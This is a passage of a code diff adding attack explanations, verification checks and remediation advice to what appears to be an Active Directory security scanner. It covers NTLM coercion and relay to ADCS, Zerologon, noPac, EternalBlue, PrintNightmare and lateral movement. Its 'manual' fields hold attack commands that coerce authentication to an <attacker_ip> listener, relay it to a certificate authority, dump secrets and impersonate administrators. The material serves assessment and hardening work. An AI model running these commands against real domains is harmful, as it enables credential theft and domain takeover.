+            "{source} calls the coercion method against {target} (originally over "
+            "the \\PIPE\\lsarpc named pipe, reachable even unauthenticated on early "
+            "unpatched hosts) and captures the incoming authentication. That "
+            "machine-account authentication is then relayed — classically to an "
+            "ADCS web-enrollment endpoint (ESC8) to obtain a certificate for the "
+            "victim, most damagingly a domain controller — turning a coercion "
+            "primitive into domain compromise."
+        ),
+        "manual": (
+            "# Coerce the target over MS-EFSRPC to authenticate to your listener:\n"
+            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip> "
+            "--filter-method-name EfsRpc\n"
+            "#   (or the standalone PoC)  petitpotam.py -u <user> -p <pass> "
+            "<attacker_ip> {target}\n"
+            "# Pair with a relay to ADCS web enrollment (ESC8) to obtain a cert as "
+            "the victim machine:\n"
+            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
+            "--adcs --template DomainController"
+        ),
+        "verify_windows": (
+            "Confirm the EFS RPC service is reachable and whether the coercion "
+            "patch (KB5005413 guidance) and NTLM relay mitigations are in place. "
+            "Check the EFS service state and that the RPC filter is deployed:\n"
+            "Get-Service EFS\n"
+            "netsh rpc filter show filter\n"
+            "# Confirm SMB signing / LDAP channel binding so relayed "
+            "authentication is rejected:\n"
+            "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature"
+        ),
+        "verify_linux": (
+            "Enumerate the coercion methods the target still exposes (a dry-run "
+            "that does not complete a relay):\n"
+            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr"
+        ),
+        "remediation": (
+            "Apply the current Windows updates that address EFSRPC coercion and "
+            "follow Microsoft's guidance in KB5005413 to protect against NTLM "
+            "relay attacks.",
+            "Enable SMB signing everywhere and enforce LDAP signing plus channel "
+            "binding on domain controllers so coerced authentication cannot be "
+            "relayed.",
+            "Deploy RPC filters to block the MS-EFSRPC interface from untrusted "
+            "networks (netsh rpc filter) where EFS remote management is not needed.",
+            "Where practical, disable NTLM in favour of Kerberos so a coerced "
+            "authentication yields nothing relayable, and remove ADCS HTTP web "
+            "enrollment (the common relay target).",
+        ),
+    },
+    "printerbug": {
+        "short": (
+            "PrinterBug: {source} can force {target} to authenticate to an "
+            "attacker-chosen host through the Print System Remote Protocol "
+            "(MS-RPRN), capturing or relaying the victim machine's credentials."
+        ),
+        "long": (
+            "The PrinterBug abuses the Print System Remote Protocol (MS-RPRN). Its "
+            "RpcRemoteFindFirstPrinterChangeNotificationEx method lets a client ask "
+            "a print server to notify it of print changes at a UNC path; when that "
+            "path is attacker-controlled (\\\\attacker\\...), the print server "
+            "{target} connects back and authenticates as its machine account. Any "
+            "host running the Print Spooler service is exploitable, and spooler is "
+            "enabled by default on many servers including domain controllers. "
+            "{source_type} {source} triggers the callback against {target} over the "
+            "\\PIPE\\spoolss named pipe and captures the machine-account "
+            "authentication, which is then relayed (for example to ADCS ESC8, or to "
+            "LDAP to configure resource-based constrained delegation) to escalate "
+            "toward {target}."
+        ),
+        "manual": (
+            "# Coerce the target's Print Spooler to authenticate to your listener:\n"
+            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip> "
+            "--filter-method-name RpcRemoteFindFirstPrinterChangeNotification\n"
+            "#   (or the standalone PoC)  printerbug.py "
+            "'<domain>/<user>:<pass>@{target}' <attacker_ip>\n"
+            "# Pair with a relay (e.g. to ADCS web enrollment, ESC8):\n"
+            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
+            "--adcs --template DomainController"
+        ),
+        "verify_windows": (
+            "Confirm whether the Print Spooler service is running on the target "
+            "(the coercion prerequisite):\n"
+            "Get-Service Spooler\n"
+            "Get-CimInstance Win32_Service -Filter \"Name='Spooler'\" |\n"
+            "  Select-Object Name, State, StartMode\n"
+            "# On domain controllers and servers that do not print, the spooler "
+            "should be disabled."
+        ),
+        "verify_linux": (
+            "Enumerate whether the target still exposes the spooler coercion "
+            "method (dry run, no relay):\n"
+            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn"
+        ),
+        "remediation": (
+            "Disable the Print Spooler service on every server that does not need "
+            "to print, especially domain controllers: Set-Service -Name Spooler "
+            "-StartupType Disabled; Stop-Service Spooler.",
+            "Where the spooler must run, deploy the 'Allow Print Spooler to accept "
+            "client connections' GPO set to Disabled to block remote print "
+            "notifications.",
+            "Enable SMB signing and enforce LDAP signing plus channel binding so a "
+            "coerced machine authentication cannot be relayed.",
+            "Prefer Kerberos over NTLM and remove ADCS HTTP web enrollment so the "
+            "common relay targets are unavailable.",
+        ),
+    },
+    "dfscoerce": {
+        "short": (
+            "DFSCoerce: {source} can force {target} to authenticate to an "
+            "attacker-chosen host through the DFS Namespace Management protocol "
+            "(MS-DFSNM), capturing or relaying the victim machine's credentials."
+        ),
+        "long": (
+            "DFSCoerce abuses the Distributed File System Namespace Management "
+            "protocol (MS-DFSNM), exposed by the DFS Namespace service on domain "
+            "controllers through the \\PIPE\\netdfs named pipe. Its NetrDfsAddStdRoot "
+            "and NetrDfsRemoveStdRoot methods take a server name; when it is set to "
+            "an attacker-controlled host, {target} connects back and authenticates "
+            "as its machine account. {source_type} {source} calls the method "
+            "against {target} and captures that authentication, which is then "
+            "relayed (classically to ADCS ESC8, or to LDAP for RBCD) to escalate "
+            "toward {target}. DFSCoerce is valuable because the DFSNM service runs "
+            "on domain controllers by default and, unlike the spooler, cannot "
+            "simply be disabled without breaking DFS."
+        ),
+        "manual": (
+            "# Coerce the target over MS-DFSNM to authenticate to your listener:\n"
+            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip> "
+            "--filter-method-name NetrDfs\n"
+            "#   (or the standalone PoC)  dfscoerce.py -u <user> -p <pass> "
+            "-d <domain> <attacker_ip> {target}\n"
+            "# Pair with a relay (e.g. to ADCS web enrollment, ESC8):\n"
+            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
+            "--adcs --template DomainController"
+        ),
+        "verify_windows": (
+            "Confirm the DFS Namespace service is present on the target (the "
+            "coercion surface) and that relay mitigations are enforced:\n"
+            "Get-Service Dfs\n"
+            "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature\n"
+            "# The DFSNM interface cannot simply be disabled on a DC, so the "
+            "defence is to block the relay, not the coercion."
+        ),
+        "verify_linux": (
+            "Enumerate whether the target still exposes the DFSNM coercion methods "
+            "(dry run, no relay):\n"
+            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm"
+        ),
+        "remediation": (
+            "Because the DFS Namespace service cannot be disabled on a domain "
+            "controller without breaking DFS, focus on blocking the relay: enable "
+            "SMB signing everywhere and enforce LDAP signing plus channel binding "
+            "on domain controllers.",
+            "Prefer Kerberos over NTLM and, where possible, disable NTLM so a "
+            "coerced machine authentication has nothing relayable.",
+            "Remove ADCS HTTP web enrollment and enable Extended Protection for "
+            "Authentication on any remaining enrollment endpoint so the common "
+            "relay target is closed.",
+            "Deploy RPC filters to restrict access to the MS-DFSNM interface to "
+            "authorized management hosts where feasible.",
+        ),
+    },
+    "coerceandrelayntlmtoadcs": {
+        "short": (
+            "Coerce-and-relay to ADCS: {source} forces {target} to authenticate, "
+            "relays that authentication to the CA's enrollment endpoint, and "
+            "obtains a certificate for the victim — up to a domain controller."
+        ),
+        "long": (
+            "This is the full coercion-plus-relay chain against Active Directory "
+            "Certificate Services. {source_type} {source} first coerces {target} "
+            "into authenticating to an attacker-controlled listener using any "
+            "coercion primitive (MS-EFSRPC / PetitPotam, MS-RPRN / PrinterBug, or "
+            "MS-DFSNM / DFSCoerce). The victim authenticates as its machine "
+            "account, and because the CA's web-enrollment (ESC8) or ICPR RPC "
+            "(ESC11) endpoint accepts NTLM without channel binding, that "
+            "authentication is relayed straight to the CA and used to request a "
+            "client authentication certificate as the victim. When the coerced "
+            "victim is a domain controller, the resulting certificate authenticates "
+            "the DC machine account and permits directory replication — a direct "
+            "path to compromise of {target}. The relay needs only a valid domain "
+            "identity, so it is cross-forest capable."
+        ),
+        "manual": (
+            "# 1) Start the relay to the CA's enrollment endpoint, requesting a DC "
+            "template:\n"
+            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
+            "--adcs --template DomainController\n"
+            "# 2) Coerce the target (any of EFSRPC / RPRN / DFSNM) to auth to the "
+            "relay:\n"
+            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
+            "# 3) Authenticate with the issued certificate to recover a TGT / NT "
+            "hash:\n"
+            "certipy auth -pfx dc.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm both halves: the CA offers a relay-able enrollment endpoint "
+            "AND the coercion surface is reachable. For the CA:\n"
+            "Get-WindowsFeature ADCS-Web-Enrollment, ADCS-Enroll-Web-Svc\n"
+            "Get-WebBinding | Where-Object { $_.protocol -eq 'http' }\n"
+            "# For the relay defence, confirm SMB signing and LDAP channel binding "
+            "are enforced:\n"
+            "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature"
+        ),
+        "verify_linux": (
+            "Enumerate the CA enrollment endpoints and the target's coercion "
+            "methods (read-only, no relay completed):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
+        ),
+        "remediation": (
+            "Close the relay target: remove ADCS HTTP web enrollment, require "
+            "HTTPS with Extended Protection for Authentication on any enrollment "
+            "site, and enable RPC request encryption on the CA (ESC8 / ESC11 "
+            "hardening).",
+            "Enforce SMB signing everywhere and LDAP signing plus channel binding "
+            "on domain controllers so relayed authentication is rejected.",
+            "Reduce the coercion surface: disable the Print Spooler on servers that "
+            "do not print and apply Microsoft's EFSRPC coercion guidance "
+            "(KB5005413).",
+            "Prefer Kerberos over NTLM, and disable NTLM where feasible, so a "
+            "coerced authentication yields nothing that can be relayed.",
+        ),
+    },
+    "coercetotgt": {
+        "short": (
+            "Coerce-to-TGT: {source} forces {target} to authenticate and combines "
+            "the coerced machine authentication with unconstrained delegation to "
+            "capture the victim's Kerberos TGT."
+        ),
+        "long": (
+            "Coerce-to-TGT chains a coercion primitive with unconstrained "
+            "delegation. When {source_type} {source} controls a host that is "
+            "trusted for unconstrained delegation, any account that authenticates "
+            "to it via Kerberos leaves a forwardable TGT cached in that host's "
+            "memory. The attacker uses a coercion trigger (PetitPotam / PrinterBug "
+            "/ DFSCoerce) to force {target} — ideally a domain controller — to "
+            "authenticate to the delegation-trusted host, then extracts the "
+            "victim's TGT from the ticket cache. With a DC's TGT the attacker can "
+            "act as the domain controller and replicate directory secrets, "
+            "compromising {target}. The technique turns 'a machine can be coerced' "
+            "plus 'a host has unconstrained delegation' into full domain "
+            "compromise."
+        ),
+        "manual": (
+            "# On the unconstrained-delegation host, capture inbound TGTs while "
+            "coercing the target:\n"
+            "krbrelayx.py -u <user> -p <pass>   # listens and extracts forwarded "
+            "TGTs\n"
+            "# Coerce the DC to authenticate to the delegation host:\n"
+            "coercer coerce -u <user> -p <pass> -t {target} -l <deleg_host>\n"
+            "# Use the captured DC TGT (e.g. to replicate secrets):\n"
+            "impacket-secretsdump -k -no-pass -dc-ip <dc_ip> {target}"
+        ),
+        "verify_windows": (
+            "Find hosts trusted for unconstrained delegation (the prerequisite for "
+            "this chain) and confirm coercion mitigations:\n"
+            "Get-ADComputer -LDAPFilter "
+            "'(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties "
+            "TrustedForDelegation | Select-Object Name, TrustedForDelegation\n"
+            "# Confirm sensitive accounts are marked 'Account is sensitive and "
+            "cannot be delegated' or are in Protected Users."
+        ),
+        "verify_linux": (
+            "Enumerate unconstrained-delegation hosts and the target's coercion "
+            "methods (read-only):\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> --trusted-for-delegation\n"
+            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
+        ),
+        "remediation": (
+            "Remove unconstrained delegation from every host that does not "
+            "strictly require it (Set-ADComputer -Identity <host> "
+            "-TrustedForDelegation $false); migrate any legitimate need to "
+            "constrained or resource-based constrained delegation.",
+            "Add privileged accounts to the Protected Users group and set 'Account "
+            "is sensitive and cannot be delegated' so their TGTs are never "
+            "forwardable to a delegation host.",
+            "Reduce the coercion surface: disable the Print Spooler on servers that "
+            "do not print and apply Microsoft's EFSRPC coercion guidance.",
+            "Enforce SMB signing and prefer Kerberos-only authentication with "
+            "strong mitigations so coerced authentication cannot be abused.",
+        ),
+    },
+    "zerologon": {
+        "short": (
+            "Zerologon (CVE-2020-1472): {source} can exploit a Netlogon "
+            "cryptographic flaw to reset the domain controller {target}'s machine "
+            "account password to empty and seize the domain."
+        ),
+        "long": (
+            "Zerologon (CVE-2020-1472) is a cryptographic flaw in the Netlogon "
+            "Remote Protocol (MS-NRPC). The protocol's AES-CFB8 authentication uses "
+            "an all-zero initialization vector, so roughly one in 256 attempts with "
+            "an all-zero client challenge and credential authenticates successfully "
+            "with no knowledge of the machine's password. An unauthenticated "
+            "attacker with network access to a domain controller can therefore, "
+            "after a few hundred attempts, authenticate as the DC and then use "
+            "Netlogon to reset the DC's own machine account password to an empty "
+            "value in Active Directory. With the DC account effectively taken over, "
+            "the attacker replicates directory secrets (including the krbtgt hash) "
+            "and compromises the entire domain of {target}. Resetting a DC's "
+            "machine password is destructive — it desynchronizes the DC from AD and "
+            "can break authentication domain-wide if not carefully restored — so "
+            "ADscan reports the exposure but does not execute the reset."
+        ),
+        "manual": (
+            "# Non-destructive detection only (does NOT reset the password):\n"
+            "nxc smb {target} -u '' -p '' -M zerologon\n"
+            "#   (or the checker PoC)  zerologon_tester.py <dc_netbios_name> "
+            "{target}\n"
+            "# Weaponised exploitation resets the DC machine password and is "
+            "destructive — coordinate with the client before running any such tool."
+        ),
+        "verify_windows": (
+            "Confirm the domain controllers have the CVE-2020-1472 patch and are in "
+            "enforcement mode. Check the patch level and that Netlogon secure-"
+            "channel enforcement is on:\n"
+            "Get-HotFix | Where-Object { $_.HotFixID -in "
+            "'KB4557222','KB4565349','KB4565351' }\n"
+            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon"
+            "\\Parameters' -Name FullSecureChannelProtection -ErrorAction "
+            "SilentlyContinue"
+        ),
+        "verify_linux": (
+            "Run the non-destructive Zerologon check (it does NOT change the "
+            "machine password):\n"
+            "nxc smb {target} -u '' -p '' -M zerologon\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/netlogon/zerologon"
+        ),
+        "remediation": (
+            "Apply the August 2020 (and later) cumulative updates on every domain "
+            "controller so CVE-2020-1472 is fixed, then confirm they are running.",
+            "Enable Netlogon secure-channel enforcement mode "
+            "(FullSecureChannelProtection = 1) so vulnerable Netlogon connections "
+            "are rejected outright.",
+            "Review the DC machine account password age (Get-ADComputer -Identity "
+            "<dc> -Properties PwdLastSet) and reset it deliberately if a Zerologon "
+            "attempt is suspected, following Microsoft's guidance to keep AD and "
+            "the local secret in sync.",
+            "Monitor for Netlogon authentication anomalies and the associated "
+            "machine-account change events (Event ID 4742) on domain controllers.",
+        ),
+    },
+    "nopac": {
+        "short": (
+            "noPac (CVE-2021-42278/42287): {source} creates a machine account, "
+            "renames it to impersonate a domain controller, and requests a "
+            "service ticket that grants domain-admin-level access to {target}."
+        ),
+        "long": (
+            "noPac chains two Kerberos flaws, CVE-2021-42278 (sAMAccountName "
+            "spoofing) and CVE-2021-42287 (KDC ticket confusion). By default any "
+            "authenticated user can create machine accounts (ms-DS-"
+            "MachineAccountQuota is 10). {source_type} {source} creates a computer "
+            "account, then renames its sAMAccountName to match a domain "
+            "controller's name but without the trailing '$'. It requests a TGT for "
+            "that name, then deletes or renames the account. When it presents the "
+            "TGT for an S4U2self service ticket, the KDC cannot find the exact name "
+            "and falls back to appending '$', resolving to the real DC — so it "
+            "issues a service ticket whose PAC identifies the caller as the domain "
+            "controller. The attacker uses that ticket to act with DC privileges "
+            "against {target}, typically replicating directory secrets. Because the "
+            "technique manipulates and deletes domain accounts, ADscan reports the "
+            "exposure but does not execute it."
+        ),
+        "manual": (
+            "# Detect the MachineAccountQuota and patch prerequisites "
+            "(non-destructive):\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -M maq\n"
+            "# Weaponised exploitation (creates + renames + deletes a machine "
+            "account — coordinate with the client first):\n"
+            "impacket-getST -spn 'cifs/{target}' -impersonate administrator "
+            "-dc-ip <dc_ip> '<domain>/<new_machine>$:<machine_pass>'"
+        ),
+        "verify_windows": (
+            "Confirm the patch is present and the machine-account quota is not "
+            "wide open. Check the two CVE patches and the quota:\n"
+            "Get-HotFix | Where-Object { $_.InstalledOn -ge (Get-Date "
+            "'2021-11-09') }\n"
+            "Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties "
+            "ms-DS-MachineAccountQuota | Select-Object ms-DS-MachineAccountQuota\n"
+            "# A quota of 0 removes the account-creation prerequisite."
+        ),
+        "verify_linux": (
+            "Read the machine-account quota (the noPac prerequisite) without "
+            "exploiting:\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> -M maq\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing"
+        ),
+        "remediation": (
+            "Apply the November 2021 cumulative updates (KB5008102, KB5008380, "
+            "KB5008602) on all domain controllers so CVE-2021-42278 and "
+            "CVE-2021-42287 are fixed.",
+            "Set ms-DS-MachineAccountQuota to 0 so ordinary users cannot create "
+            "the machine account the attack depends on (Set-ADDomain -Identity "
+            "<domain> -Replace @{{'ms-DS-MachineAccountQuota'=0}}); delegate "
+            "computer creation to a defined admin group instead.",
+            "Audit machine-account creations and sAMAccountName changes (Event IDs "
+            "4741 and 4781) so a spoofing attempt is detected.",
+            "Add privileged accounts to Protected Users and monitor for Kerberos "
+            "ticket anomalies (Event IDs 4768 / 4769) referencing renamed machine "
+            "accounts.",
+        ),
+    },
+    "ms17-010": {
+        "short": (
+            "MS17-010 (EternalBlue): {source} can exploit an SMBv1 memory "
+            "corruption flaw on {target} to run code remotely as SYSTEM without "
+            "authentication."
+        ),
+        "long": (
+            "MS17-010 (EternalBlue) is a set of remote code execution "
+            "vulnerabilities in Microsoft's SMBv1 server. A crafted sequence of "
+            "SMBv1 packets triggers a pool memory corruption in srv.sys, letting an "
+            "unauthenticated attacker on the network execute arbitrary code in "
+            "kernel context — SYSTEM — on the target {target}. {source_type} "
+            "{source} needs only network access to TCP 445 with SMBv1 enabled; no "
+            "credentials are required. It is the exploit behind WannaCry and "
+            "NotPetya. Because the exploit corrupts kernel memory it can crash the "
+            "target (a bluescreen) if it fails, which makes it disruptive against "
+            "production systems. It remains present wherever legacy SMBv1 has not "
+            "been removed."
+        ),
+        "manual": (
+            "# Non-destructive detection of the SMBv1 vulnerability:\n"
+            "nxc smb {target} -u '' -p '' -M ms17-010\n"
+            "#   (or)  nmap -p445 --script smb-vuln-ms17-010 {target}\n"
+            "# Weaponised exploitation risks crashing the target (kernel memory "
+            "corruption) — coordinate with the client before running any exploit."
+        ),
+        "verify_windows": (
+            "Confirm the MS17-010 patch is installed and, more decisively, that "
+            "SMBv1 is disabled (removing the vulnerable protocol entirely):\n"
+            "Get-HotFix -Id KB4013389 -ErrorAction SilentlyContinue\n"
+            "Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol |\n"
+            "  Select-Object FeatureName, State\n"
+            "Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol"
+        ),
+        "verify_linux": (
+            "Run the non-destructive EternalBlue check (no exploitation):\n"
+            "nmap -p445 --script smb-vuln-ms17-010 {target}\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/smb"
+        ),
+        "remediation": (
+            "Disable and remove SMBv1 on every host (Disable-WindowsOptionalFeature "
+            "-Online -FeatureName SMB1Protocol; Set-SmbServerConfiguration "
+            "-EnableSMB1Protocol $false) — this removes the vulnerable protocol "
+            "rather than only patching it.",
+            "Apply the MS17-010 security update (KB4013389 and its rollups) on any "
+            "system that must retain SMBv1 temporarily.",
+            "Restrict SMB (TCP 445) at the network boundary and between segments so "
+            "legacy hosts are not reachable from untrusted networks.",
+            "Inventory and decommission the legacy systems that still require "
+            "SMBv1, since a single unpatched host remains a wormable entry point.",
+        ),
+    },
+    "printnightmare": {
+        "short": (
+            "PrintNightmare (CVE-2021-34527): {source} can abuse the Print Spooler "
+            "on {target} to load an attacker-supplied driver and run code as "
+            "SYSTEM, or gain code execution on a remote spooler."
+        ),
+        "long": (
+            "PrintNightmare (CVE-2021-34527, with CVE-2021-1675) is a flaw in the "
+            "Windows Print Spooler service. The RpcAddPrinterDriverEx method fails "
+            "to properly validate that a caller adding a printer driver has the "
+            "required privilege, so an authenticated user can direct the spooler to "
+            "load an arbitrary DLL 'driver' from a local or remote path. Because "
+            "the spooler runs as SYSTEM, the loaded code executes with full local "
+            "privileges — local privilege escalation on the host, and remote code "
+            "execution when the vulnerable spooler is targeted over the network. "
+            "{source_type} {source} exploits {target}'s spooler to run code as "
+            "SYSTEM; on a domain controller that is immediate domain compromise. "
+            "Loading a driver into a live SYSTEM service is disruptive and can "
+            "destabilize the host, so ADscan reports the exposure but does not "
+            "execute it."
+        ),
+        "manual": (
+            "# Non-destructive check that the spooler is running and remotely "
+            "reachable:\n"
+            "nxc smb {target} -u <user> -p <pass> -M spooler\n"
+            "#   (or)  rpcdump.py '<domain>/<user>:<pass>@{target}' | grep -i "
+            "'MS-RPRN\\|spoolss'\n"
+            "# Weaponised exploitation loads a driver into a SYSTEM service and is "
+            "disruptive — coordinate with the client before running any exploit."
+        ),
+        "verify_windows": (
+            "Confirm the spooler is disabled where possible, the CVE-2021-34527 "
+            "patch is applied, and the point-and-print hardening is set:\n"
+            "Get-Service Spooler | Select-Object Name, Status, StartType\n"
+            "Get-HotFix | Where-Object { $_.InstalledOn -ge (Get-Date "
+            "'2021-07-06') }\n"
+            "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\"
+            "Printers\\PointAndPrint' -ErrorAction SilentlyContinue"
+        ),
+        "verify_linux": (
+            "Non-destructive check that the target still exposes the spooler "
+            "interface (no exploitation):\n"
+            "nxc smb {target} -u <user> -p <pass> -M spooler\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/print-spooler-service"
+        ),
+        "remediation": (
+            "Disable the Print Spooler service on every server that does not need "
+            "to print, especially domain controllers (Set-Service -Name Spooler "
+            "-StartupType Disabled; Stop-Service Spooler).",
+            "Apply the CVE-2021-34527 security updates and enforce the point-and-"
+            "print restrictions GPO so only administrators can install printer "
+            "drivers (RestrictDriverInstallationToAdministrators = 1).",
+            "Where the spooler must run, block remote connections to it via the "
+            "'Allow Print Spooler to accept client connections' GPO set to "
+            "Disabled.",
+            "Monitor for spooler driver-load events (Microsoft-Windows-PrintService "
+            "Event ID 316) that indicate an unexpected driver was added.",
+        ),
+    },
+    # ─────────────────────────────────────────────────────────────────────── #
+    # BEGIN Tier-2 didactic overlays (concurrent-edit friendly — do NOT reorder
+    # or reformat existing overlays above; this is an append-only union block).
+    # Lateral movement / access · DCSync + secret-dump primitives · ACL control ·
+    # delegation / cross-forest · MSSQL escalation.
+    # ─────────────────────────────────────────────────────────────────────── #
+    "adminto": {
+        "short": (
+            "{source} holds local administrator rights on {target}, so it can log "
+            "on and run code as SYSTEM and harvest every credential cached on that "
+            "host."
+        ),
+        "long": (
+            "Local administrator membership on a host is total control of that "
+            "machine. {source_type} {source} that is a local admin on {target} can "
+            "authenticate over SMB to the ADMIN$/C$ shares, install and start a "
+            "service, schedule a task, or invoke WMI/DCOM to execute commands as "
+            "NT AUTHORITY\\SYSTEM. From SYSTEM it can read the SAM and LSA secrets, "
+            "dump credentials cached in LSASS, and steal the tokens of any other "
+            "user currently logged on — turning one admin relationship into a "
+            "foothold for lateral movement across the domain. The right is granted "
+            "either by explicit membership in the host's local Administrators group "
+            "or by a domain group nested into it (often through a widely-scoped "
+            "GPO-pushed 'workstation admins' group), which is why a single "
+            "over-broad group can expose hundreds of machines at once."
+        ),
+        "manual": (
+            "# Prove local admin by executing as SYSTEM (pick the quietest transport):\n"
+            "impacket-wmiexec -k -no-pass <domain>/<user>@{target}   # WMI, Event 4688\n"
+            "#   (or)  impacket-psexec <domain>/<user>:<pass>@{target}   # SCM service, Event 7045 (loud)\n"
+            "# Confirm admin + harvest secrets from a low-noise probe:\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain>   # a 'Pwn3d!' marker == local admin\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain> --sam --lsa"
+        ),
+        "verify_windows": (
+            "List the local Administrators group on {target} and expand nested "
+            "domain groups to see who is effectively an admin:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock "
+            "{{ Get-LocalGroupMember -Group 'Administrators' }}\n"
+            "# Trace a domain group that is nested into local Administrators via GPO:\n"
+            "Get-ADGroupMember -Identity '<workstation-admins-group>' -Recursive |\n"
+            "  Select-Object name, objectClass"
+        ),
+        "verify_linux": (
+            "Confirm the admin relationship without dumping anything — the 'Pwn3d!' "
+            "marker is printed only when the account is a local administrator:\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
+        ),
+        "remediation": (
+            "Enumerate the effective local administrators on the host and remove every principal that does not require them: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
+            "Replace broad, GPO-pushed 'all workstation admins' groups with narrowly-scoped, per-tier groups so a single group cannot make one account admin on hundreds of machines; audit the nesting with Get-ADGroupMember -Recursive.",
+            "Deploy LAPS so each host has a unique, rotated local Administrator password, removing the shared-local-admin lateral-movement path.",
+            "Enforce tier separation (ESAE): Tier-0 admins must never log on to Tier-1/Tier-2 hosts, so their credentials are never cached where a member-server compromise can reach them. Monitor Event IDs 4624/4672 for privileged logons to unexpected hosts.",
+        ),
+    },
+    "canrdp": {
+        "short": (
+            "{source} can open an interactive Remote Desktop session on {target}, "
+            "landing a live desktop it can use to run tooling and reach further into "
+            "the network."
+        ),
+        "long": (
+            "Membership in the Remote Desktop Users group (or local administrator "
+            "rights) lets {source_type} {source} establish an interactive RDP "
+            "session on {target}. An interactive logon is more powerful than a "
+            "network logon: the account gets a full desktop, its credentials are "
+            "cached in LSASS for the life of the session, and any other user "
+            "already logged on interactively has their tokens and cached secrets "
+            "exposed to anyone who reaches SYSTEM on that box. RDP is a sanctioned "
+            "administration channel, so the traffic itself blends in — the risk is "
+            "who can reach it and what privilege they land with. If Restricted "
+            "Admin mode is not enforced, the interactive credentials are recoverable, "
+            "making a single RDP foothold a pivot for credential theft and onward "
+            "lateral movement."
+        ),
+        "manual": (
+            "# Confirm RDP is reachable and the account can log on interactively:\n"
+            "nxc rdp {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == interactive logon allowed\n"
+            "# Open the session from a Linux vantage:\n"
+            "xfreerdp /v:{target} /u:<user> /p:<pass> /d:<domain> /cert:ignore"
+        ),
+        "verify_windows": (
+            "List who may log on via RDP — the local Remote Desktop Users group "
+            "plus anyone in local Administrators:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock "
+            "{{ Get-LocalGroupMember -Group 'Remote Desktop Users' }}\n"
+            "# Confirm the RDP service is enabled and check whether NLA is required:\n"
+            "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' "
+            "-Name fDenyTSConnections"
+        ),
+        "verify_linux": (
+            "Non-destructive check that the account is permitted an interactive RDP "
+            "logon (no session opened):\n"
+            "nxc rdp {target} -u <user> -p <pass> -d <domain>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
+        ),
+        "remediation": (
+            "Review the Remote Desktop Users group on the host and remove principals that do not need interactive access: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Remote Desktop Users' }.",
+            "Require Network Level Authentication and, for administrative RDP, enable Restricted Admin mode (Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DisableRestrictedAdmin -Value 0) so credentials are not left recoverable in the session.",
+            "Restrict which source hosts may reach TCP 3389 with a host firewall / network segmentation rule so RDP is not exposed broadly across the estate.",
+            "Add high-value accounts to the Protected Users group and enforce tier separation so Tier-0 credentials never RDP into member servers. Monitor Event IDs 4624 (logon type 10) and 4778 for interactive RDP sessions.",
+        ),
+    },
+    "canpsremote": {
+        "short": (
+            "{source} can run PowerShell remotely on {target} over WinRM, executing "
+            "code at the privilege it lands with through a legitimate management "
+            "channel."
+        ),
+        "long": (
+            "Windows Remote Management (WinRM/PowerShell Remoting) lets "
+            "{source_type} {source} open a remote PowerShell session on {target} "
+            "and run commands there. Access is granted by membership in the Remote "
+            "Management Users group or by local administrator rights, and the code "
+            "runs with the privilege of the connecting account — full SYSTEM-capable "
+            "control when that account is a local admin. Because WinRM is the "
+            "sanctioned remote-administration protocol (ports 5985/5986), the "
+            "activity looks like normal operations, which is exactly why it is a "
+            "favoured lateral-movement channel: an attacker who lands a remote "
+            "session can load tooling in memory, harvest cached credentials, and "
+            "pivot to the next host without dropping a service or a binary the way "
+            "noisier techniques do."
+        ),
+        "manual": (
+            "# Confirm WinRM access and command execution:\n"
